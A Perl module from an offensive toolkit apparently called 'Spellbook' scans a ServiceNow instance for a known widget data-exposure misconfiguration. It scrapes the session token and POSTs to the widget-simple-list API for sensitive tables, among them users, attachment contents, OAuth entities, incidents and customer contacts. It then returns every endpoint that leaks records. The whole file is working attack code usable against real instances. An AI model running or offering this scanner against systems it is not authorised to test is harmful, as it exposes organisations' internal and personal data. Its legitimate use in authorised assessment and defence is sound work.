package Spellbook::Advisory::ServiceNow_Widget_Data_Exposure {
    use strict;
    use warnings;
    use JSON;
    use Try::Tiny;
    use HTTP::Request;
    use HTTP::Cookies;
    use Spellbook::Core::UserAgent;

    our $VERSION = '0.0.1';

    my @TABLE_LIST = (
        't=cmdb_model&f=name',
        't=cmn_department&f=app_name',
        't=kb_knowledge&f=text',
        't=licensable_app&f=app_name',
        't=alm_asset&f=display_name',
        't=sys_attachment&f=file_name',
        't=sys_attachment_doc&f=data',
        't=oauth_entity&f=name',
        't=cmn_cost_center&f=name',
        't=sc_cat_item&f=name',
        't=cmn_company&f=name',
        't=customer_account&f=name',
        't=sys_email_attachment&f=email',
        't=cmn_notif_device&f=email_address',
        't=incident&f=short_description',
        't=work_order&f=number',
        't=incident&f=number',
        't=sn_customerservice_case&f=number',
        't=task&f=number',
        't=customer_project&f=number',
        't=customer_project_task&f=number',
        't=sys_user&f=name',
        't=customer_contact&f=name',
    );

    sub new {
        my ($self, $parameters) = @_;
        my ($help, $target, $fast_check, @result);

        Getopt::Long::GetOptionsFromArray (
            $parameters,
            'h|help'       => \$help,
            't|target=s'   => \$target,
            'f|fast-check' => \$fast_check
        );

        if ($target) {
            if ($target !~ /^http(?:s)?:\/\//msx) {
                $target = "https://$target";
            }

            $target =~ s/\/+$//msx;

            my $user_agent = Spellbook::Core::UserAgent -> new();
            my $cookie_jar = HTTP::Cookies -> new();
            $user_agent -> cookie_jar($cookie_jar);

            my $initial_response = $user_agent -> get($target);

            my $g_ck;
            if ($initial_response -> content() =~ /var\s+g_ck\s*=\s*'([a-zA-Z0-9]+)'/msx) {
                $g_ck = $1;
            }

            my @tables = $fast_check ? ('t=kb_knowledge&f=text') : @TABLE_LIST;

            for my $table (@tables) {
                try {
                    my $endpoint = "$target/api/now/sp/widget/widget-simple-list?$table";

                    my $headers = HTTP::Headers -> new(
                        'Content-Type' => 'application/json',
                        'Accept'       => 'application/json',
                        'Connection'   => 'close',
                    );

                    if ($g_ck) {
                        $headers -> header('X-UserToken' => $g_ck);
                    }

                    my $request  = HTTP::Request -> new('POST', $endpoint, $headers, '{}');
                    my $response = $user_agent -> request($request);

                    if ($response -> code() == 200 || $response -> code() == 201) {
                        my $body = decode_json($response -> content());

                        if (
                            exists $body -> {result}
                            && exists $body -> {result}{data}
                            && exists $body -> {result}{data}{count}
                            && $body -> {result}{data}{count} > 0
                            && exists $body -> {result}{data}{list}
                            && scalar @{$body -> {result}{data}{list}} > 0
                        ) {
                            push @result, $endpoint;
                        }
                    }
                };
            }

            return @result;
        }

        if ($help) {
            return "
                \rAdvisory::ServiceNow_Widget_Data_Exposure
                \r==========================================
                \r-h, --help        See this menu
                \r-t, --target      Define a target (ServiceNow instance URL)
                \r-f, --fast-check  Only check the kb_knowledge table\n\n";
        }

        return 0;
    }
}

1;
